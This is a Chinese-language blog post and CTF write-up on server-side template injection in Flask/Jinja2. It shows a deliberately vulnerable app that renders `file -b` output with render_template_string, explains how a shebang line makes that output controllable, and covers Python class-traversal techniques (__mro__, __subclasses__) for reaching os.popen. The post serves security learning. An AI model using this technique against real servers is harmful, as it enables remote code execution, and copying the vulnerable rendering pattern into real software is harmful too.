<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>SSTI - Potat0w0</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Potat0w0"><meta name="msapplication-TileImage" content="/img/icon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Potat0w0"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="SSTI"><meta property="og:type" content="blog"><meta property="og:title" content="SSTI"><meta property="og:url" content="http://example.com/2023/02/09/ssti/"><meta property="og:site_name" content="Potat0w0"><meta property="og:description" content="SSTI"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429032204160.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429032353870.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429030651913.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429032742576.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429034451879.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429191534591.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429191635511.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429191927593.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429193849800.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429193915755.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429194117415.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429194209528.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429195640928.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429195803084.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230429195958840.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730212602385.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730212648721.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730212858437.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730213654861.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730213714396.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730215716944.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730215805610.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730225207888.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230730233526240.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731005556778.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731012232999.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731021637628.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731021730919.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731021752614.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731021832024.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731025126135.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731024741335.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731030014042.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731030026544.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731025728066.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731030517813.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731170423110.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731180156155.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230731183825048.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801020731807.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801021306517.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801021603150.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801021808956.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801023029680.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801023528609.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801030534571.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801034608529.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801042557864.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801042414133.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801171743303.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801174345081.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801174537355.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801180249226.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802003013611.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801222353241.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801224316737.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801235148461.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230801235916098.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802000940569.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802002124378.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802002143318.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802003435533.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802001152213.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802002515106.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802002356262.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802002419304.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802005306318.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802005341317.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802005523502.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802005559881.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802010231838.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802011023942.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802011047462.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802013135950.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802013210012.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802193034146.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802193133736.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802013559353.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802015231902.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802020434847.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802020620149.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802032116868.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802023425961.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802030842185.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802152241886.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802135939015.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802142259287.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802145108337.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802150900349.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802151957916.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802152224096.png"><meta property="og:image" content="http://example.com/2023/02/09/ssti/image-20230802172049912.png"><meta property="article:published_time" content="2023-02-09T08:31:25.000Z"><meta property="article:modified_time" content="2024-01-10T17:26:12.071Z"><meta property="article:author" content="Potat0w0"><meta property="article:tag" content="Web"><meta property="article:tag" content="ssti"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/2023/02/09/ssti/image-20230429032204160.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/02/09/ssti/"},"headline":"SSTI","image":["http://example.com/2023/02/09/ssti/image-20230429032204160.png","http://example.com/2023/02/09/ssti/image-20230429032353870.png","http://example.com/2023/02/09/ssti/image-20230429030651913.png","http://example.com/2023/02/09/ssti/image-20230429032742576.png","http://example.com/2023/02/09/ssti/image-20230429034451879.png","http://example.com/2023/02/09/ssti/image-20230429191534591.png","http://example.com/2023/02/09/ssti/image-20230429191635511.png","http://example.com/2023/02/09/ssti/image-20230429191927593.png","http://example.com/2023/02/09/ssti/image-20230429193849800.png","http://example.com/2023/02/09/ssti/image-20230429193915755.png","http://example.com/2023/02/09/ssti/image-20230429194117415.png","http://example.com/2023/02/09/ssti/image-20230429194209528.png","http://example.com/2023/02/09/ssti/image-20230429195640928.png","http://example.com/2023/02/09/ssti/image-20230429195803084.png","http://example.com/2023/02/09/ssti/image-20230429195958840.png","http://example.com/2023/02/09/ssti/image-20230730212602385.png","http://example.com/2023/02/09/ssti/image-20230730212648721.png","http://example.com/2023/02/09/ssti/image-20230730212858437.png","http://example.com/2023/02/09/ssti/image-20230730213654861.png","http://example.com/2023/02/09/ssti/image-20230730213714396.png","http://example.com/2023/02/09/ssti/image-20230730215716944.png","http://example.com/2023/02/09/ssti/image-20230730215805610.png","http://example.com/2023/02/09/ssti/image-20230730225207888.png","http://example.com/2023/02/09/ssti/image-20230730233526240.png","http://example.com/2023/02/09/ssti/image-20230731005556778.png","http://example.com/2023/02/09/ssti/image-20230731012232999.png","http://example.com/2023/02/09/ssti/image-20230731021637628.png","http://example.com/2023/02/09/ssti/image-20230731021730919.png","http://example.com/2023/02/09/ssti/image-20230731021752614.png","http://example.com/2023/02/09/ssti/image-20230731021832024.png","http://example.com/2023/02/09/ssti/image-20230731025126135.png","http://example.com/2023/02/09/ssti/image-20230731024741335.png","http://example.com/2023/02/09/ssti/image-20230731030014042.png","http://example.com/2023/02/09/ssti/image-20230731030026544.png","http://example.com/2023/02/09/ssti/image-20230731025728066.png","http://example.com/2023/02/09/ssti/image-20230731030517813.png","http://example.com/2023/02/09/ssti/image-20230731170423110.png","http://example.com/2023/02/09/ssti/image-20230731180156155.png","http://example.com/2023/02/09/ssti/image-20230731183825048.png","http://example.com/2023/02/09/ssti/image-20230801020731807.png","http://example.com/2023/02/09/ssti/image-20230801021306517.png","http://example.com/2023/02/09/ssti/image-20230801021603150.png","http://example.com/2023/02/09/ssti/image-20230801021808956.png","http://example.com/2023/02/09/ssti/image-20230801023029680.png","http://example.com/2023/02/09/ssti/image-20230801023528609.png","http://example.com/2023/02/09/ssti/image-20230801030534571.png","http://example.com/2023/02/09/ssti/image-20230801034608529.png","http://example.com/2023/02/09/ssti/image-20230801042557864.png","http://example.com/2023/02/09/ssti/image-20230801042414133.png","http://example.com/2023/02/09/ssti/image-20230801171743303.png","http://example.com/2023/02/09/ssti/image-20230801174345081.png","http://example.com/2023/02/09/ssti/image-20230801174537355.png","http://example.com/2023/02/09/ssti/image-20230801180249226.png","http://example.com/2023/02/09/ssti/image-20230802003013611.png","http://example.com/2023/02/09/ssti/image-20230801222353241.png","http://example.com/2023/02/09/ssti/image-20230801224316737.png","http://example.com/2023/02/09/ssti/image-20230801235148461.png","http://example.com/2023/02/09/ssti/image-20230801235916098.png","http://example.com/2023/02/09/ssti/image-20230802000940569.png","http://example.com/2023/02/09/ssti/image-20230802002124378.png","http://example.com/2023/02/09/ssti/image-20230802002143318.png","http://example.com/2023/02/09/ssti/image-20230802003435533.png","http://example.com/2023/02/09/ssti/image-20230802001152213.png","http://example.com/2023/02/09/ssti/image-20230802002515106.png","http://example.com/2023/02/09/ssti/image-20230802002356262.png","http://example.com/2023/02/09/ssti/image-20230802002419304.png","http://example.com/2023/02/09/ssti/image-20230802005306318.png","http://example.com/2023/02/09/ssti/image-20230802005341317.png","http://example.com/2023/02/09/ssti/image-20230802005523502.png","http://example.com/2023/02/09/ssti/image-20230802005559881.png","http://example.com/2023/02/09/ssti/image-20230802010231838.png","http://example.com/2023/02/09/ssti/image-20230802011023942.png","http://example.com/2023/02/09/ssti/image-20230802011047462.png","http://example.com/2023/02/09/ssti/image-20230802013135950.png","http://example.com/2023/02/09/ssti/image-20230802013210012.png","http://example.com/2023/02/09/ssti/image-20230802193034146.png","http://example.com/2023/02/09/ssti/image-20230802193133736.png","http://example.com/2023/02/09/ssti/image-20230802013559353.png","http://example.com/2023/02/09/ssti/image-20230802015231902.png","http://example.com/2023/02/09/ssti/image-20230802020434847.png","http://example.com/2023/02/09/ssti/image-20230802020620149.png","http://example.com/2023/02/09/ssti/image-20230802032116868.png","http://example.com/2023/02/09/ssti/image-20230802023425961.png","http://example.com/2023/02/09/ssti/image-20230802030842185.png","http://example.com/2023/02/09/ssti/image-20230802152241886.png","http://example.com/2023/02/09/ssti/image-20230802135939015.png","http://example.com/2023/02/09/ssti/image-20230802142259287.png","http://example.com/2023/02/09/ssti/image-20230802145108337.png","http://example.com/2023/02/09/ssti/image-20230802150900349.png","http://example.com/2023/02/09/ssti/image-20230802151957916.png","http://example.com/2023/02/09/ssti/image-20230802152224096.png","http://example.com/2023/02/09/ssti/image-20230802172049912.png"],"datePublished":"2023-02-09T08:31:25.000Z","dateModified":"2024-01-10T17:26:12.071Z","author":{"@type":"Person","name":"Potat0w0"},"publisher":{"@type":"Organization","name":"Potat0w0","logo":{"@type":"ImageObject","url":"http://example.com/img/title.png"}},"description":"SSTI"}</script><link rel="canonical" href="http://example.com/2023/02/09/ssti/"><link rel="icon" href="/img/icon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/title.png" alt="Potat0w0" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">时间轴</a><a class="navbar-item" href="/categories">归档</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a><a class="navbar-item" href="/link">友链</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-02-09T08:31:25.000Z" title="2023/2/9 16:31:25">2023-02-09</time>发表</span><span class="level-item"><time dateTime="2024-01-10T17:26:12.071Z" title="2024/1/11 01:26:12">2024-01-11</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">常见漏洞</a><span> / </span><a class="link-muted" href="/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a></span><span class="level-item">1 小时读完 (大约8219个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">SSTI</h1><div class="content"><!-- more -->

<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="sources"><a href="#sources" class="headerlink" title="sources:"></a>sources:</h2><p><a target="_blank" rel="noopener" href="https://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters">https://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters</a></p>
<p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/3.1.x/templates/">https://jinja.palletsprojects.com/en/3.1.x/templates/</a></p>
<p><a target="_blank" rel="noopener" href="https://dormousehole.readthedocs.io/en/latest/">https://dormousehole.readthedocs.io/en/latest/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584">https://xz.aliyun.com/t/9584</a></p>
<h2 id="2023FCTF热身赛filechecker-mini"><a href="#2023FCTF热身赛filechecker-mini" class="headerlink" title="2023FCTF热身赛filechecker_mini"></a>2023FCTF热身赛filechecker_mini</h2><p>打开题目，让我们上传一个文件：</p>
<p><img src="/2023/02/09/ssti/image-20230429032204160.png"></p>
<p>桌面上随便丢了个php文件进去提交看看会有啥情况：</p>
<p><img src="/2023/02/09/ssti/image-20230429032353870.png"></p>
<p>判断文件类型，(MIME绕过预定)</p>
<p>附件下载下来先看源码：</p>
<p>index.html：</p>
<p><img src="/2023/02/09/ssti/image-20230429030651913.png"></p>
<p>可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, render_template_string<br><span class="hljs-keyword">from</span> waitress <span class="hljs-keyword">import</span> serve<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><br>app_dir = os.path.split(os.path.realpath(__file__))[<span class="hljs-number">0</span>]<br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app_dir&#125;</span>/upload/&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,result=<span class="hljs-string">&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;</span>)<br><br>        <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>            f = request.files[<span class="hljs-string">&#x27;file-upload&#x27;</span>]<br>            filepath = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], f.filename)<br><br>            <span class="hljs-keyword">if</span> os.path.exists(filepath) <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;..&quot;</span> <span class="hljs-keyword">in</span> filepath:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&quot;Don&#x27;t (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                f.save(filepath)<br>                file_check_res = subprocess.check_output(<br>                    [<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>                    shell=<span class="hljs-literal">False</span>, <br>                    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>                    timeout=<span class="hljs-number">1</span><br>                )<br>                os.remove(filepath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;empty&quot;</span> <span class="hljs-keyword">in</span> file_check_res <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;cannot open&quot;</span> <span class="hljs-keyword">in</span> file_check_res:<br>                    file_check_res=<span class="hljs-string">&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot;</span><br>                <span class="hljs-keyword">return</span> render_template_string(file_check_res)<br><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, result=<span class="hljs-string">&#x27;Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    serve(app, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">3000</span>, threads=<span class="hljs-number">1000</span>, cleanup_interval=<span class="hljs-number">30</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/ssti/image-20230429032742576.png"></p>
<p>上面大家都用<code>render_template()</code>就你爱用<code>render_template_string()</code>是吧（指指点点，一眼模板注入，那么我们就希望<code>file_check_res</code>里有我们能够执行的rce代码。<code>file_check_res</code>哪来的？倒退往上看。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">f.save(filepath)<br>file_check_res = subprocess.check_output(<br>	[<span class="hljs-string">&quot;/bin/file&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, filepath], <br>	shell=<span class="hljs-literal">False</span>, <br>	encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,<br>	imeout=<span class="hljs-number">1</span><br>	)<br>os.remove(filepath)<br></code></pre></td></tr></table></figure>

<p>先保存filepath这样一个文件，<code>subprocess.check_output(command)</code>返回Linux命令行输出，然后再把filepath文件删除，那么这里的<code>file_check_res</code>就是<code>file -b &#123;filepath&#125;</code>的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用<code>file -b</code> 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型，</p>
<p><img src="/2023/02/09/ssti/image-20230429034451879.png"></p>
<p>代码中的-b参数作用：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">-b 　#列出辨识结果时，不显示文件名称。<br></code></pre></td></tr></table></figure>

<p>所以在文件名上动手脚的想法也破灭了（悲。</p>
<p>卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。<img src="/2023/02/09/ssti/image-20230429191534591.png"></p>
<p>点开tests里面是各种针对该<code>file</code>命令的<a target="_blank" rel="noopener" href="https://github.com/file/file/tree/master/tests">测试结果</a></p>
<p><img src="/2023/02/09/ssti/image-20230429191635511.png"></p>
<p>这8个分别分别是在文本中写入bash脚本的4种情况和对应的用<code>file</code>命令执行的输出结果，可以看出如果文本内容为<code>#!/usr/bin</code>开头的那么输出结果中会显示文本中的其他内容。</p>
<p><img src="/2023/02/09/ssti/image-20230429191927593.png"></p>
<p>本地做测试：创建一个文本文件修改内容如下</p>
<p><img src="/2023/02/09/ssti/image-20230429193849800.png"></p>
<p>测试结果如下：</p>
<p><img src="/2023/02/09/ssti/image-20230429193915755.png"></p>
<p>显而易见，输出可控，可以进行模板渲染。新建一个文本文件内容如下，上传文件</p>
<p><img src="/2023/02/09/ssti/image-20230429194117415.png"></p>
<p><img src="/2023/02/09/ssti/image-20230429194209528.png"></p>
<p>存在ssti漏洞，开始利用，调用os模块</p>
<p><img src="/2023/02/09/ssti/image-20230429195640928.png"></p>
<p><img src="/2023/02/09/ssti/image-20230429195803084.png"></p>
<p>调用popen()方法。</p>
<p><img src="/2023/02/09/ssti/image-20230429195958840.png"></p>
<p>上传文件，获取flag。</p>
<hr>
<h2 id="ssti-labs"><a href="#ssti-labs" class="headerlink" title="ssti_labs"></a>ssti_labs</h2><p>搭建踩的坑：</p>
<p>pip python 还有各种库版本之间的冲突，我pip和python全用的3，python版本是3.8。出现ImportError错误导致无法导入’soft_unicode’模块是由于markupsafe库的版本引起的，在py3.8中markupsafe库中的soft_unicode模块被移除，先升级injja2和markupsafe库到最新版本确保它们和python3.8兼容，<code>pip install --upgrade jijna2markupsafe</code>。还有itsdangerous库中的json模块也被移除，同上，<code>pip install --upgrade itsdangerous</code>，然后还是不行，是由于flask和itsdangerous版本之间的兼容性问题，将flask和itsdangerous降级到与py3.8兼容的较旧版本<code>pip install flask==1.1.4 itsdangerous==1.1.0</code>，成功部署完之后，又遇到问题，运行<code>python3 app.py</code>后，显示<code>* Running on http://127.0.0.1:5001/ (Press CTRL+C to quit)</code>但是却无法通过公网ip访问到。gpt debug，默认情况下flask只会绑定到回环地址，没法绑定到公网ip，所以无法外部访问，最后一行改成<code>app.run(host=&#39;0.0.0.0&#39;,port=5001,debug=&#39;True&#39;)</code>，然后就是，千万别用root跑(悲)，不然会被日的很惨(感谢L1ao学长的指出)，当然就算创建新用户跑，也面临着提权被干的风险，所以，最好还是用容器吧，还学了点别的小知识</p>
<p><code>kill -9 PID</code>：强制kill进程</p>
<p><code>adduser your_username</code>：在服务器上创建一个普通用户</p>
<p><code>chown your_username:your_username app.py</code>：将app.py的所有权转移到普通用户</p>
<p><code>su - your_username</code>：用普通用户身份登录</p>
<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>漏洞存在</p>
<p><img src="/2023/02/09/ssti/image-20230730212602385.png"></p>
<p><code>__class__</code>一个对象的类的引用，用于实例化对象，这里是字符串对象，<code>obj.__class__</code>返回该对象所属类，对于类本身，<code>Class.__class__</code>返回它的元类<img src="/2023/02/09/ssti/image-20230730212648721.png"></p>
<p>当前类的基类，这里有三种获取方法，<code>__base__</code>(获取直接父类)，<code>__bases__</code>(<code>Class.__bases__</code>返回Class的元组，包含它的直接父类)，<code>__mro__</code>，<code>__mro__</code>方法返回一个类的方法解析顺序，其中的类是在方法解析的过程中在寻找父类时需要考虑的类。要注意获取到的对象是多个还是单个，下面使用<code>__subclasses__()</code>时要注意的</p>
<p><img src="/2023/02/09/ssti/image-20230730212858437.png"></p>
<p><img src="/2023/02/09/ssti/image-20230730213654861.png"></p>
<p><img src="/2023/02/09/ssti/image-20230730213714396.png"></p>
<p>有这些类继承的方法，我们就可以从任何一个变量(字符串、数组，整型，配置(config)，甚至文件本身(self)等等)，回溯到最顶层基类（<code>&lt;class&#39;object&#39;&gt;</code>）中去，再获得到此基类所有实现的类，就可以获得到很多的类和方法了。</p>
<p><code>__subclasses__()</code>方法，直接返回一个类的所有子类列表，我们已经在最顶层基类了，看<code>&lt;class&#39;object&#39;&gt;</code>下有哪些子类，很多，SSTI 的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件或执行命令的类）加以利用。</p>
<p><img src="/2023/02/09/ssti/image-20230730215716944.png"></p>
